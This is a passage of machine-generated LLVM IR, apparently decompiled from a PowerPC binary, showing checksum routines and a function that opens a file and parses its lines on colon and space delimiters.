  uselistorder i32* %r30.global-to-local, { 0, 1, 5, 2, 4, 3, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10008ab8, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10004980, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_1000491c, { 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_100021c0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 72, 73, 74, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder label %dec_label_pc_100048c0, { 1, 0 }
  uselistorder label %dec_label_pc_100047e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004790, { 1, 0 }
  uselistorder label %dec_label_pc_1000478c, { 1, 0 }
  uselistorder label %dec_label_pc_1000478c.outer, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10004738, { 1, 0 }
}

define i32 @function_1000491c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000491c:
  %tmp = or i32 %arg1, 1
  %tmp8 = icmp eq i32 %tmp, 1
  br i1 %tmp8, label %dec_label_pc_10004950, label %dec_label_pc_10004928

dec_label_pc_10004928:                            ; preds = %dec_label_pc_1000491c
  %v1_10004928 = add i32 %arg1, -2
  %v1_1000492c = udiv i32 %v1_10004928, 2
  %v1_10004930 = add nuw i32 %v1_1000492c, 1
  %v0_1000493c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000493c

dec_label_pc_1000493c:                            ; preds = %dec_label_pc_1000493c, %dec_label_pc_10004928
  %v0_1000494c = phi i32 [ %v1_1000494c, %dec_label_pc_1000493c ], [ %v1_10004930, %dec_label_pc_10004928 ]
  %v0_10004948 = phi i32 [ %v2_10004948, %dec_label_pc_1000493c ], [ 0, %dec_label_pc_10004928 ]
  %v0_10004944 = phi i32 [ %v1_10004944, %dec_label_pc_1000493c ], [ %v0_1000493c.pre, %dec_label_pc_10004928 ]
  %v1_1000493c = inttoptr i32 %v0_10004944 to i16*
  %v2_1000493c = load i16, i16* %v1_1000493c, align 2
  %v3_1000493c = zext i16 %v2_1000493c to i32
  %v1_10004944 = add i32 %v0_10004944, 2
  store i32 %v1_10004944, i32* @r3, align 4
  %v2_10004948 = add i32 %v3_1000493c, %v0_10004948
  %v1_1000494c = add i32 %v0_1000494c, -1
  %v2_1000494c = icmp eq i32 %v1_1000494c, 0
  br i1 %v2_1000494c, label %dec_label_pc_10004950.loopexit, label %dec_label_pc_1000493c

dec_label_pc_10004950.loopexit:                   ; preds = %dec_label_pc_1000493c
  %tmp11 = mul i32 %v1_1000492c, -2
  %tmp10 = add i32 %v1_10004928, %tmp11
  br label %dec_label_pc_10004950

dec_label_pc_10004950:                            ; preds = %dec_label_pc_10004950.loopexit, %dec_label_pc_1000491c
  %v0_1000495c = phi i32 [ 0, %dec_label_pc_1000491c ], [ %v2_10004948, %dec_label_pc_10004950.loopexit ]
  %v0_10004950 = phi i32 [ %arg1, %dec_label_pc_1000491c ], [ %tmp10, %dec_label_pc_10004950.loopexit ]
  %v3_10004950 = icmp eq i32 %v0_10004950, 1
  br i1 %v3_10004950, label %dec_label_pc_10004958, label %dec_label_pc_10004960

dec_label_pc_10004958:                            ; preds = %dec_label_pc_10004950
  %v0_10004958 = load i32, i32* @r3, align 4
  %v1_10004958 = add i32 %v0_10004958, 1
  %v2_10004958 = inttoptr i32 %v1_10004958 to i8*
  %v3_10004958 = load i8, i8* %v2_10004958, align 1
  %v4_10004958 = zext i8 %v3_10004958 to i32
  %v2_1000495c = add i32 %v4_10004958, %v0_1000495c
  br label %dec_label_pc_10004960

dec_label_pc_10004960:                            ; preds = %dec_label_pc_10004950, %dec_label_pc_10004958
  %v0_10004960 = phi i32 [ %v0_1000495c, %dec_label_pc_10004950 ], [ %v2_1000495c, %dec_label_pc_10004958 ]
  %v1_10004960 = urem i32 %v0_10004960, 65536
  %v1_10004964 = udiv i32 %v0_10004960, 65536
  %v2_10004968 = add nuw nsw i32 %v1_10004960, %v1_10004964
  %v1_1000496c = udiv i32 %v2_10004968, 65536
  %v2_10004970 = add nuw nsw i32 %v1_1000496c, %v2_10004968
  %v1_10004974 = urem i32 %v2_10004970, 65536
  %v1_10004978 = xor i32 %v1_10004974, 65535
  ret i32 %v1_10004978

; uselistorder directives
  uselistorder i32 %v2_10004968, { 1, 0 }
  uselistorder i32 %v0_1000495c, { 1, 0 }
  uselistorder i32 %v1_1000494c, { 1, 0 }
  uselistorder i32 %v1_10004944, { 1, 0 }
  uselistorder label %dec_label_pc_10004960, { 1, 0 }
}

define i32 @function_10004980(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004980:
  %r0.global-to-local = alloca i32, align 4
  %v1_10004984 = add i32 %arg1, 12
  %v2_10004984 = inttoptr i32 %v1_10004984 to i32*
  %v3_10004984 = load i32, i32* %v2_10004984, align 4
  %v1_10004988 = add i32 %arg1, 16
  %v2_10004988 = inttoptr i32 %v1_10004988 to i32*
  %v3_10004988 = load i32, i32* %v2_10004988, align 4
  %tmp = icmp slt i32 %arg3, 2
  br i1 %tmp, label %dec_label_pc_100049c4, label %dec_label_pc_10004990

dec_label_pc_10004990:                            ; preds = %dec_label_pc_10004980
  %v1_10004990 = add i32 %arg3, -2
  %v1_10004998 = icmp slt i32 %v1_10004990, 0
  %v1_1000499c = udiv i32 %v1_10004990, 2
  %v1_100049a0 = add nuw i32 %v1_1000499c, 1
  br i1 %v1_10004998, label %dec_label_pc_10004a2c, label %dec_label_pc_100049ac.preheader

dec_label_pc_100049ac.preheader:                  ; preds = %dec_label_pc_10004a2c, %dec_label_pc_10004990
  %v0_100049c04 = phi i32 [ 1, %dec_label_pc_10004a2c ], [ %v1_100049a0, %dec_label_pc_10004990 ]
  %v0_100049ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100049ac

dec_label_pc_100049ac:                            ; preds = %dec_label_pc_100049ac.preheader, %dec_label_pc_100049ac
  %v0_100049c0 = phi i32 [ %v0_100049c04, %dec_label_pc_100049ac.preheader ], [ %v1_100049c0, %dec_label_pc_100049ac ]
  %v0_100049bc = phi i32 [ 0, %dec_label_pc_100049ac.preheader ], [ %v2_100049bc, %dec_label_pc_100049ac ]
  %v0_100049b4 = phi i32 [ %v0_100049ac.pre, %dec_label_pc_100049ac.preheader ], [ %v1_100049b4, %dec_label_pc_100049ac ]
  %v1_100049ac = inttoptr i32 %v0_100049b4 to i16*
  %v2_100049ac = load i16, i16* %v1_100049ac, align 2
  %v3_100049ac = zext i16 %v2_100049ac to i32
  store i32 %v3_100049ac, i32* %r0.global-to-local, align 4
  %v1_100049b4 = add i32 %v0_100049b4, 2
  %v2_100049bc = add i32 %v3_100049ac, %v0_100049bc
  %v1_100049c0 = add i32 %v0_100049c0, -1
  %v2_100049c0 = icmp eq i32 %v1_100049c0, 0
  br i1 %v2_100049c0, label %dec_label_pc_100049c4.loopexit, label %dec_label_pc_100049ac

dec_label_pc_100049c4.loopexit:                   ; preds = %dec_label_pc_100049ac
  %tmp14 = mul i32 %v0_100049c04, -2
  %tmp13 = add i32 %tmp14, %arg3
  %v3_100049b8 = icmp eq i32 %tmp13, 1
  br i1 %v3_100049b8, label %dec_label_pc_10004a18, label %dec_label_pc_100049c8

dec_label_pc_100049c4:                            ; preds = %dec_label_pc_10004980
  %v3_10004980 = icmp eq i32 %arg3, 1
  br i1 %v3_10004980, label %dec_label_pc_100049c4.dec_label_pc_10004a18_crit_edge, label %dec_label_pc_100049c8

dec_label_pc_100049c4.dec_label_pc_10004a18_crit_edge: ; preds = %dec_label_pc_100049c4
  %v0_10004a18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10004a18

dec_label_pc_100049c8:                            ; preds = %dec_label_pc_100049c4.loopexit, %dec_label_pc_100049c4, %dec_label_pc_10004a18
  %v0_100049e0 = phi i32 [ 0, %dec_label_pc_100049c4 ], [ %v2_10004a1c, %dec_label_pc_10004a18 ], [ %v2_100049bc, %dec_label_pc_100049c4.loopexit ]
  %v1_100049c8 = urem i32 %v3_10004984, 65536
  %v1_100049cc = udiv i32 %v3_10004984, 65536
  %v2_100049d0 = add nuw nsw i32 %v1_100049c8, %v1_100049cc
  store i32 %v2_100049d0, i32* %r0.global-to-local, align 4
  %v1_100049d4 = urem i32 %v3_10004988, 65536
  %v1_100049d8 = add i32 %arg1, 9
  %v2_100049d8 = inttoptr i32 %v1_100049d8 to i8*
  %v3_100049d8 = load i8, i8* %v2_100049d8, align 1
  %v4_100049d8 = zext i8 %v3_100049d8 to i32
  %v1_100049dc = udiv i32 %v3_10004988, 65536
  %v2_100049e0 = add i32 %v0_100049e0, %v1_100049dc
  %v2_100049e8 = add i32 %v2_100049e0, %v4_100049d8
  %v2_100049e4 = add i32 %v2_100049d0, %arg2
  %v2_100049ec = add i32 %v2_100049e4, %v1_100049d4
  %v2_100049f0 = add i32 %v2_100049ec, %v2_100049e8
  store i32 %v2_100049f0, i32* %r0.global-to-local, align 4
  %v1_100049f4 = call i32 @__asm_rlwinm.(i32 %v2_100049f0, i32 16, i32 16, i32 31)
  %v4_100049f4 = icmp eq i32 %v1_100049f4, 0
  br i1 %v4_100049f4, label %dec_label_pc_10004a0c, label %dec_label_pc_100049fc

dec_label_pc_100049fc:                            ; preds = %dec_label_pc_100049c8, %dec_label_pc_100049fc
  %v1_10004a00 = phi i32 [ %v1_10004a04, %dec_label_pc_100049fc ], [ %v1_100049f4, %dec_label_pc_100049c8 ]
  %v0_100049fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100049fc = urem i32 %v0_100049fc, 65536
  %v2_10004a00 = add i32 %v1_100049fc, %v1_10004a00
  store i32 %v2_10004a00, i32* %r0.global-to-local, align 4
  %v1_10004a04 = call i32 @__asm_rlwinm.(i32 %v2_10004a00, i32 16, i32 16, i32 31)
  %v4_10004a04 = icmp eq i32 %v1_10004a04, 0
  br i1 %v4_10004a04, label %dec_label_pc_10004a0c, label %dec_label_pc_100049fc

dec_label_pc_10004a0c:                            ; preds = %dec_label_pc_100049fc, %dec_label_pc_100049c8
  %v0_10004a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_10004a0c = urem i32 %v0_10004a0c, 65536
  %v1_10004a10 = xor i32 %v1_10004a0c, 65535
  ret i32 %v1_10004a10

dec_label_pc_10004a18:                            ; preds = %dec_label_pc_100049c4.dec_label_pc_10004a18_crit_edge, %dec_label_pc_100049c4.loopexit
  %v0_10004a18 = phi i32 [ %v1_100049b4, %dec_label_pc_100049c4.loopexit ], [ %v0_10004a18.pre, %dec_label_pc_100049c4.dec_label_pc_10004a18_crit_edge ]
  %v0_10004a1c10 = phi i32 [ %v2_100049bc, %dec_label_pc_100049c4.loopexit ], [ 0, %dec_label_pc_100049c4.dec_label_pc_10004a18_crit_edge ]
  %v1_10004a18 = inttoptr i32 %v0_10004a18 to i8*
  %v2_10004a18 = load i8, i8* %v1_10004a18, align 1
  %v3_10004a18 = zext i8 %v2_10004a18 to i32
  store i32 %v3_10004a18, i32* %r0.global-to-local, align 4
  %v2_10004a1c = add i32 %v3_10004a18, %v0_10004a1c10
  br label %dec_label_pc_100049c8

dec_label_pc_10004a2c:                            ; preds = %dec_label_pc_10004990
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100049ac.preheader

; uselistorder directives
  uselistorder i32 %v1_10004a04, { 1, 0 }
  uselistorder i32 %v1_100049c0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7 }
  uselistorder i32 %arg3, { 3, 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100049fc, { 1, 0 }
  uselistorder label %dec_label_pc_100049c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100049ac, { 1, 0 }
}

define i32 @function_10004a38(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004a38:
  %r26.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-8792 = alloca i32, align 4
  %stack_var_-8760 = alloca i8, align 1
  %stack_var_-8776 = alloca i8, align 1
  %stack_var_-4151 = alloca i32, align 4
  %stack_var_-8247 = alloca i32, align 4
  %v0_10004a48 = load i32, i32* @r27, align 4
  %v2_10004a4c = ptrtoint i32* %stack_var_-8247 to i32
  store i32 %v2_10004a4c, i32* @r27, align 4
  %v2_10004a54 = ptrtoint i32* %stack_var_-4151 to i32
  %v0_10004a58 = load i32, i32* @r29, align 4
  store i32 %arg1, i32* @r29, align 4
  %v0_10004a68 = load i32, i32* @r25, align 4
  %v2_10004a6c = ptrtoint i8* %stack_var_-8776 to i32
  %v0_10004a70 = load i32, i32* @r30, align 4
  %v2_10004a74 = ptrtoint i8* %stack_var_-8760 to i32
  store i32 %v2_10004a74, i32* @r30, align 4
  %v0_10004a78 = load i32, i32* @r31, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v0_10004a80 = load i32, i32* @r23, align 4
  %v0_10004a88 = load i32, i32* @r28, align 4
  store i32 268454544, i32* @lr, align 4
  %v3_10004a8c = call i32 @function_10008608(i32 %v2_10004a4c, i32 0, i32 4096)
  store i32 268454560, i32* @lr, align 4
  %v3_10004a9c = call i32 @function_10008608(i32 %v2_10004a54, i32 0, i32 4096)
  store i32 268454576, i32* @lr, align 4
  %v3_10004aac = call i32 @function_10008608(i32 %v2_10004a74, i32 0, i32 513)
  %v0_10004ab8 = load i32, i32* @r29, align 4
  %v0_10004abc = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10004abc, i32* %stack_var_-8792, align 4
  %v3_10004acc = trunc i32 %v0_10004ab8 to i8
  %v4_10004acc = call i32 @function_10007a3c(i8 %v3_10004acc, i32 16, i32 %v2_10004a6c)
  store i32 268454616, i32* @lr, align 4
  %v2_10004ad4 = call i32 @function_100074dc(i8* nonnull %stack_var_-8776)
  %v3_10004ad8 = icmp eq i32 %v2_10004ad4, 2
  br i1 %v3_10004ad8, label %dec_label_pc_10005004, label %dec_label_pc_10004ae0

dec_label_pc_10004ae0:                            ; preds = %dec_label_pc_10004a38, %dec_label_pc_10005004
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10004aec.71 to i32), i32* @lr, align 4
  %v1_10004ae8 = call i32 @function_10006c64(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_10004af4.72 to i32), i32* @lr, align 4
  %v1_10004af0 = call i32 @function_10006c64(i32 7)
  store i32 268454652, i32* @lr, align 4
  %v1_10004af8 = call i32 @function_10006c64(i32 9)
  store i32 268454672, i32* @lr, align 4
  %v3_10004b0c = call i32 @function_10007ed0(i32 ptrtoint ([14 x i8]* @global_var_1000a814.73 to i32), i32 0)
  %v3_10004b10 = icmp eq i32 %v3_10004b0c, -1
  store i32 %v3_10004b0c, i32* @r28, align 4
  br i1 %v3_10004b10, label %dec_label_pc_10004f58, label %dec_label_pc_10004b1c

dec_label_pc_10004b1c:                            ; preds = %dec_label_pc_10004ae0
  %v2_10004b1c = ptrtoint i32* %stack_var_-8792 to i32
  store i32 %v2_10004b1c, i32* %r26.global-to-local, align 4
  store i32 268454704, i32* @lr, align 4
  %v4_10004b2c89 = call i32 @function_1000773c(i8* nonnull %stack_var_-8760, i32 512, i32 %v3_10004b0c)
  %v3_10004b3092 = icmp eq i32 %v4_10004b2c89, 0
  br i1 %v3_10004b3092, label %dec_label_pc_10004cd8.loopexit, label %dec_label_pc_10004b38

dec_label_pc_10004b38:                            ; preds = %dec_label_pc_10004b1c, %dec_label_pc_10004b20.backedge
  %v3_10004b38 = load i8, i8* %stack_var_-8760, align 1
  %v3_10004b3c = icmp eq i8 %v3_10004b38, 0
  br i1 %v3_10004b3c, label %dec_label_pc_10004b20.backedge, label %dec_label_pc_10004b44

dec_label_pc_10004b20.backedge:                   ; preds = %dec_label_pc_10004b58, %dec_label_pc_10004b38, %dec_label_pc_10004bc8, %dec_label_pc_10004c60, %dec_label_pc_10004cac
  %v0_10004b28.pre = load i32, i32* @r28, align 4
  store i32 268454704, i32* @lr, align 4
  %v4_10004b2c = call i32 @function_1000773c(i8* nonnull %stack_var_-8760, i32 512, i32 %v0_10004b28.pre)
  %v3_10004b30 = icmp eq i32 %v4_10004b2c, 0
  br i1 %v3_10004b30, label %dec_label_pc_10004cd8.loopexit, label %dec_label_pc_10004b38

dec_label_pc_10004b44:                            ; preds = %dec_label_pc_10004b38
  %v3_10004b44 = icmp eq i8 %v3_10004b38, 58
  store i32 3, i32* @r31, align 4
  br i1 %v3_10004b44, label %dec_label_pc_10004b78, label %dec_label_pc_10004b54

dec_label_pc_10004b54:                            ; preds = %dec_label_pc_10004b44
  %v1_10004b5c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10004b58

dec_label_pc_10004b58:                            ; preds = %dec_label_pc_10004b6c, %dec_label_pc_10004b54
  %v0_10004b58 = phi i32 [ %v1_10004b58, %dec_label_pc_10004b6c ], [ 0, %dec_label_pc_10004b54 ]
  %v1_10004b58 = add i32 %v0_10004b58, 1
  %v2_10004b5c = add i32 %v1_10004b58, %v1_10004b5c.pre
  %v3_10004b5c = inttoptr i32 %v2_10004b5c to i8*
  %v4_10004b5c = load i8, i8* %v3_10004b5c, align 1
  %v3_10004b60 = icmp eq i8 %v4_10004b5c, 0
  br i1 %v3_10004b60, label %dec_label_pc_10004b20.backedge, label %dec_label_pc_10004b6c

dec_label_pc_10004b6c:                            ; preds = %dec_label_pc_10004b58
  %v3_10004b64 = icmp eq i8 %v4_10004b5c, 58
  br i1 %v3_10004b64, label %dec_label_pc_10004b70, label %dec_label_pc_10004b58

dec_label_pc_10004b70:                            ; preds = %dec_label_pc_10004b6c
  %v1_10004b70 = add i32 %v0_10004b58, 4
  store i32 %v1_10004b70, i32* @r31, align 4
  %v1_10004b74 = add i32 %v0_10004b58, 3
  br label %dec_label_pc_10004b78

dec_label_pc_10004b78:                            ; preds = %dec_label_pc_10004b44, %dec_label_pc_10004b70
  %v1_10004bd0 = phi i32 [ 2, %dec_label_pc_10004b44 ], [ %v1_10004b74, %dec_label_pc_10004b70 ]
  %v0_10004b78 = load i32, i32* %r26.global-to-local, align 4
  %v2_10004b78 = add i32 %v0_10004b78, %v1_10004bd0
  %v1_10004b80 = add i32 %v2_10004b78, 32
  %v2_10004b80 = inttoptr i32 %v1_10004b80 to i8*
  %v3_10004b80 = load i8, i8* %v2_10004b80, align 1
  %v3_10004b84 = icmp eq i8 %v3_10004b80, 0
  br i1 %v3_10004b84, label %dec_label_pc_10004bc8, label %dec_label_pc_10004b8c

dec_label_pc_10004b8c:                            ; preds = %dec_label_pc_10004b78
  %v3_10004b8c = icmp eq i8 %v3_10004b80, 32
  %v1_10004b90 = add i32 %v1_10004bd0, 1
  store i32 %v1_10004b90, i32* @r31, align 4
  br i1 %v3_10004b8c, label %dec_label_pc_10004bc8, label %dec_label_pc_10004b98

dec_label_pc_10004b98:                            ; preds = %dec_label_pc_10004b8c
  %v0_10004ba0 = load i32, i32* @r30, align 4
  %v2_10004ba0 = add i32 %v0_10004ba0, %v1_10004b90
  br label %dec_label_pc_10004bac

dec_label_pc_10004bac:                            ; preds = %dec_label_pc_10004bac, %dec_label_pc_10004b98
  %v0_10004bb0 = phi i32 [ %v1_10004bb0, %dec_label_pc_10004bac ], [ %v1_10004bd0, %dec_label_pc_10004b98 ]
  %v0_10004bb4 = phi i32 [ %v1_10004bb4, %dec_label_pc_10004bac ], [ %v2_10004ba0, %dec_label_pc_10004b98 ]
  %v1_10004bac = inttoptr i32 %v0_10004bb4 to i8*
  %v2_10004bac = load i8, i8* %v1_10004bac, align 1
  %v1_10004bb0 = add i32 %v0_10004bb0, 1
  %v1_10004bb4 = add i32 %v0_10004bb4, 1
  %tmp60 = or i8 %v2_10004bac, 32
  %tmp61 = icmp eq i8 %tmp60, 32
  br i1 %tmp61, label %dec_label_pc_10004bc4, label %dec_label_pc_10004bac

dec_label_pc_10004bc4:                            ; preds = %dec_label_pc_10004bac
  %v1_10004bc4 = add i32 %v0_10004bb0, 2
  store i32 %v1_10004bc4, i32* @r31, align 4
  br label %dec_label_pc_10004bc8

dec_label_pc_10004bc8:                            ; preds = %dec_label_pc_10004b8c, %dec_label_pc_10004b78, %dec_label_pc_10004bc4
  %v1_10004bc8 = phi i32 [ %v1_10004bd0, %dec_label_pc_10004b8c ], [ %v1_10004bd0, %dec_label_pc_10004b78 ], [ %v1_10004bb0, %dec_label_pc_10004bc4 ]
  %v2_10004bc8 = add i32 %v1_10004bc8, %v0_10004b78
  %v0_10004bd0 = load i32, i32* @r30, align 4
  %v2_10004bd0 = add i32 %v0_10004bd0, %v1_10004bd0
  store i32 %v2_10004bd0, i32* @r29, align 4
  %v3_10004bd4 = add i32 %v2_10004bc8, 32
  %v4_10004bd4 = inttoptr i32 %v3_10004bd4 to i8*
  store i8 0, i8* %v4_10004bd4, align 1
  %v0_10004bd8 = load i32, i32* @r29, align 4
  store i32 268454880, i32* @lr, align 4
  %v1_10004bdc = inttoptr i32 %v0_10004bd8 to i8*
  %v2_10004bdc = call i32 @function_100074dc(i8* %v1_10004bdc)
  %v0_10004be8 = load i32, i32* @r29, align 4
  %v3_10004bec = inttoptr i32 %v0_10004be8 to i8*
  %v4_10004bec = call i32 @function_1000788c(i8* %v3_10004bec, i32 %v2_10004bdc, i32 %v2_10004a6c)
  %v3_10004bf4 = icmp eq i32 %v4_10004bec, -1
  br i1 %v3_10004bf4, label %dec_label_pc_10004b20.backedge, label %dec_label_pc_10004c00.preheader

dec_label_pc_10004c00.preheader:                  ; preds = %dec_label_pc_10004bc8
  %v0_10004c00.pre = load i32, i32* @r31, align 4
  %v0_10004c08.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10004c00.outer

dec_label_pc_10004c00.outer:                      ; preds = %dec_label_pc_10004fa8, %dec_label_pc_10004c00.preheader
  %v0_10004c1c28.ph = phi i32 [ %v1_10004f90, %dec_label_pc_10004fa8 ], [ 0, %dec_label_pc_10004c00.preheader ]
  %v0_10004c00.ph = phi i32 [ %v1_10004cb477, %dec_label_pc_10004fa8 ], [ %v0_10004c00.pre, %dec_label_pc_10004c00.preheader ]
  %v0_10004c60.ph = phi i32 [ 1, %dec_label_pc_10004fa8 ], [ 0, %dec_label_pc_10004c00.preheader ]
  br label %dec_label_pc_10004c00

dec_label_pc_10004c00:                            ; preds = %dec_label_pc_10004c00.outer, %dec_label_pc_10004f98
  %v0_10004c1c28 = phi i32 [ %v1_10004f90, %dec_label_pc_10004f98 ], [ %v0_10004c1c28.ph, %dec_label_pc_10004c00.outer ]
  %v0_10004c00 = phi i32 [ %v1_10004cb477, %dec_label_pc_10004f98 ], [ %v0_10004c00.ph, %dec_label_pc_10004c00.outer ]
  %v1_10004c00 = add i32 %v0_10004c00, 1
  %v2_10004c08 = add i32 %v1_10004c00, %v0_10004c08.pre
  %v1_10004c3468 = inttoptr i32 %v2_10004c08 to i8*
  %v2_10004c3469 = load i8, i8* %v1_10004c3468, align 1
  store i32 %v1_10004c00, i32* @r31, align 4
  %v3_10004c3c72 = icmp eq i8 %v2_10004c3469, 0
  br i1 %v3_10004c3c72, label %dec_label_pc_10004c60, label %dec_label_pc_10004c4c

dec_label_pc_10004c10:                            ; preds = %dec_label_pc_10004c4c
  %v3_10004c4080 = icmp eq i8 %v3_10004c4080.in, 9
  br i1 %v3_10004c4080, label %dec_label_pc_10004c50, label %dec_label_pc_10004c1c

dec_label_pc_10004c1c:                            ; preds = %dec_label_pc_10004c10
  %v3_10004c10 = icmp eq i32 %v0_10004c1076, 1
  br i1 %v3_10004c10, label %dec_label_pc_10004f90, label %dec_label_pc_10004c24

dec_label_pc_10004c24:                            ; preds = %dec_label_pc_10004c1c, %dec_label_pc_10004f90
  %v0_10004c24 = phi i32 [ %v1_10004f90, %dec_label_pc_10004f90 ], [ %v0_10004c5075, %dec_label_pc_10004c1c ]
  %v2_10004c24 = icmp sgt i32 %v0_10004c24, 6
  br i1 %v2_10004c24, label %dec_label_pc_10004c60, label %dec_label_pc_10004c30

dec_label_pc_10004c30:                            ; preds = %dec_label_pc_10004c50, %dec_label_pc_10004c24
  %v0_10004c1c27 = phi i32 [ %v0_10004c5075, %dec_label_pc_10004c50 ], [ %v0_10004c24, %dec_label_pc_10004c24 ]
  %v0_10004c1025 = phi i32 [ 1, %dec_label_pc_10004c50 ], [ 0, %dec_label_pc_10004c24 ]
  %v0_10004c3422 = add i32 %v0_10004c5879, 1
  %v1_10004c30 = add i32 %v1_10004cb477, 1
  %v1_10004c34 = inttoptr i32 %v0_10004c3422 to i8*
  %v2_10004c34 = load i8, i8* %v1_10004c34, align 1
  store i32 %v1_10004c30, i32* @r31, align 4
  %v3_10004c3c = icmp eq i8 %v2_10004c34, 0
  br i1 %v3_10004c3c, label %dec_label_pc_10004c60, label %dec_label_pc_10004c4c

dec_label_pc_10004c4c:                            ; preds = %dec_label_pc_10004c00, %dec_label_pc_10004c30
  %v3_10004c4080.in = phi i8 [ %v2_10004c34, %dec_label_pc_10004c30 ], [ %v2_10004c3469, %dec_label_pc_10004c00 ]
  %v3_10004c4481.in = phi i8 [ %v2_10004c34, %dec_label_pc_10004c30 ], [ %v2_10004c3469, %dec_label_pc_10004c00 ]
  %v0_10004c5879 = phi i32 [ %v0_10004c3422, %dec_label_pc_10004c30 ], [ %v2_10004c08, %dec_label_pc_10004c00 ]
  %v1_10004cb477 = phi i32 [ %v1_10004c30, %dec_label_pc_10004c30 ], [ %v1_10004c00, %dec_label_pc_10004c00 ]
  %v0_10004c1076 = phi i32 [ %v0_10004c1025, %dec_label_pc_10004c30 ], [ 0, %dec_label_pc_10004c00 ]
  %v0_10004c5075 = phi i32 [ %v0_10004c1c27, %dec_label_pc_10004c30 ], [ %v0_10004c1c28, %dec_label_pc_10004c00 ]
  %v3_10004c4481 = icmp eq i8 %v3_10004c4481.in, 32
  br i1 %v3_10004c4481, label %dec_label_pc_10004c50, label %dec_label_pc_10004c10

dec_label_pc_10004c50:                            ; preds = %dec_label_pc_10004c4c, %dec_label_pc_10004c10
  %tmp62 = icmp slt i32 %v0_10004c5075, 7
  br i1 %tmp62, label %dec_label_pc_10004c30, label %dec_label_pc_10004c60

dec_label_pc_10004c60:                            ; preds = %dec_label_pc_10004c30, %dec_label_pc_10004c24, %dec_label_pc_10004c50, %dec_label_pc_10004c00
  %v1_10004cb4.lcssa = phi i32 [ %v1_10004c00, %dec_label_pc_10004c00 ], [ %v1_10004cb477, %dec_label_pc_10004c50 ], [ %v1_10004cb477, %dec_label_pc_10004c24 ], [ %v1_10004c30, %dec_label_pc_10004c30 ]
  %v3_10004c60 = icmp eq i32 %v0_10004c60.ph, 0
  br i1 %v3_10004c60, label %dec_label_pc_10004b20.backedge, label %dec_label_pc_10004c6c

dec_label_pc_10004c6c:                            ; preds = %dec_label_pc_10004c60
  %v0_10004c6c = load i32, i32* %r26.global-to-local, align 4
  %v2_10004c6c = add i32 %v0_10004c6c, %v1_10004cb4.lcssa
  %v1_10004c70 = add i32 %v2_10004c6c, 32
  %v2_10004c70 = inttoptr i32 %v1_10004c70 to i8*
  %v3_10004c70 = load i8, i8* %v2_10004c70, align 1
  %v3_10004c74 = icmp eq i8 %v3_10004c70, 0
  br i1 %v3_10004c74, label %dec_label_pc_10004cac, label %dec_label_pc_10004c7c

dec_label_pc_10004c7c:                            ; preds = %dec_label_pc_10004c6c
  %v3_10004c7c = icmp eq i8 %v3_10004c70, 32
  br i1 %v3_10004c7c, label %dec_label_pc_10004cac, label %dec_label_pc_10004c84

dec_label_pc_10004c84:                            ; preds = %dec_label_pc_10004c7c
  %v1_10004c84 = add i32 %v1_10004cb4.lcssa, 1
  %v2_10004c88 = add i32 %v1_10004c84, %v0_10004c08.pre
  br label %dec_label_pc_10004c94

dec_label_pc_10004c94:                            ; preds = %dec_label_pc_10004c94, %dec_label_pc_10004c84
  %v0_10004c98 = phi i32 [ %v1_10004c98, %dec_label_pc_10004c94 ], [ %v1_10004cb4.lcssa, %dec_label_pc_10004c84 ]
  %v0_10004c9c = phi i32 [ %v1_10004c9c, %dec_label_pc_10004c94 ], [ %v2_10004c88, %dec_label_pc_10004c84 ]
  %v1_10004c94 = inttoptr i32 %v0_10004c9c to i8*
  %v2_10004c94 = load i8, i8* %v1_10004c94, align 1
  %v1_10004c98 = add i32 %v0_10004c98, 1
  %v1_10004c9c = add i32 %v0_10004c9c, 1
  %tmp63 = or i8 %v2_10004c94, 32
  %tmp64 = icmp eq i8 %tmp63, 32
  br i1 %tmp64, label %dec_label_pc_10004cac, label %dec_label_pc_10004c94

dec_label_pc_10004cac:                            ; preds = %dec_label_pc_10004c94, %dec_label_pc_10004c7c, %dec_label_pc_10004c6c
  %v1_10004cac = phi i32 [ %v1_10004cb4.lcssa, %dec_label_pc_10004c7c ], [ %v1_10004cb4.lcssa, %dec_label_pc_10004c6c ], [ %v1_10004c98, %dec_label_pc_10004c94 ]
  %v2_10004cac = add i32 %v1_10004cac, %v0_10004c6c
